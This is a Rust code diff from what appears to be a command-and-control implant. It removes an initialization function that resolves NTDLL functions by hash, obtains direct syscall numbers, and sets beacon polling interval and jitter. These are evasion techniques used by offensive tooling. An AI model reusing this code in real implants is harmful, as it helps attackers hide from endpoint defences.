@@ -1,12 +1,10 @@
 use core::ffi::c_void;
 use libc_print::{libc_eprintln, libc_println};
-use mod_agentcore::{instance, instance_mut, Instance, INSTANCE};
+use mod_agentcore::{instance, instance_mut};
 
-use mod_hhtgates::get_syscall_number;
 use mod_protocol_json::protocol::JsonProtocol;
 
 use mod_win32::{
-    ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb},
     nt_get_adapters_info::get_adapters_info,
     nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
     nt_peb::{
@@ -28,108 +26,6 @@ use rs2_communication_protocol::{
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
 
 use crate::commands::{encryptor_from_raw, protocol_from_raw};
-
-/// Initializes the global instance by setting up necessary system call addresses and session data.
-pub unsafe fn init_global_instance() {
-    // Hashes and function addresses for various NTDLL functions
-    const NTDLL_HASH: u32 = 0x1edab0ed;
-    const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
-    const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;
-
-    const NT_TERMINATE_THREAD: usize = 0xccf58808;
-    const NT_TERMINATE_PROCESS: usize = 0x4ed9dd4f;
-
-    const NT_CLOSE: usize = 0x40d6e69d;
-    const NT_OPEN_KEY: usize = 0x7682ed42;
-    const NT_QUERY_VALUE_KEY: usize = 0x85967123;
-    const NT_ENUMERATE_KEY: usize = 0x4d8a8976;
-    const NT_QUERY_INFORMATION_PROCESS: usize = 0x8cdc5dc2;
-    const NT_QUERY_INFORMATION_TOKEN: usize = 0xf371fe4;
-    const NT_OPEN_PROCESS_TOKEN: usize = 0x350dca99;
-
-    let mut instance = Instance::new();
-    instance.teb = nt_current_teb();
-
-    // Resolve NTDLL functions
-    instance.ntdll.module_base = ldr_module_peb(NTDLL_HASH);
-
-    // NtAllocateVirtualMemory
-    instance.ntdll.nt_allocate_virtual_memory.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY);
-    instance.ntdll.nt_allocate_virtual_memory.syscall.number =
-        get_syscall_number(instance.ntdll.nt_allocate_virtual_memory.syscall.address);
-
-    // NtFreeVirtualMemory
-    instance.ntdll.nt_free_virtual_memory.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY);
-    instance.ntdll.nt_free_virtual_memory.syscall.number =
-        get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);
-
-    // NtTerminateThread
-    instance.ntdll.nt_terminate_thread.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD);
-    instance.ntdll.nt_terminate_thread.syscall.number =
-        get_syscall_number(instance.ntdll.nt_terminate_thread.syscall.address);
-
-    // NtTerminateProcess
-    instance.ntdll.nt_terminate_process.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS);
-    instance.ntdll.nt_terminate_process.syscall.number =
-        get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);
-
-    // NtClose
-    instance.ntdll.nt_close.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_CLOSE);
-    instance.ntdll.nt_close.syscall.number =
-        get_syscall_number(instance.ntdll.nt_close.syscall.address);
-
-    // NtOpenKey
-    instance.ntdll.nt_open_key.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY);
-    instance.ntdll.nt_open_key.syscall.number =
-        get_syscall_number(instance.ntdll.nt_open_key.syscall.address);
-
-    // NtQueryValueKey
-    instance.ntdll.nt_query_value_key.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY);
-    instance.ntdll.nt_query_value_key.syscall.number =
-        get_syscall_number(instance.ntdll.nt_query_value_key.syscall.address);
-
-    // NtEnumerateKey
-    instance.ntdll.nt_enumerate_key.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY);
-    instance.ntdll.nt_enumerate_key.syscall.number =
-        get_syscall_number(instance.ntdll.nt_enumerate_key.syscall.address);
-
-    // NtQueryInformationProccess
-    instance.ntdll.nt_query_information_process.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS);
-    instance.ntdll.nt_query_information_process.syscall.number =
-        get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);
-
-    // NtOpenProcessToken
-    instance.ntdll.nt_open_process_token.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
-    instance.ntdll.nt_open_process_token.syscall.number =
-        get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);
-
-    // NtQueryInformationToken
-    instance.ntdll.nt_query_information_token.syscall.address =
-        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN);
-    instance.ntdll.nt_query_information_token.syscall.number =
-        get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);
-
-    // Init Session Data
-    instance.session.connected = false;
-    instance.session.pid = instance.teb.as_ref().unwrap().client_id.unique_process as i64;
-    instance.session.tid = instance.teb.as_ref().unwrap().client_id.unique_thread as i64;
-
-    // Init Config Data
-    instance.config.polling_interval = 15;
-    instance.config.polling_jitter = 10;
-
-    *INSTANCE.lock().get() = Some(instance);
-}
 
 /// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
 pub fn init_checkin_data() {
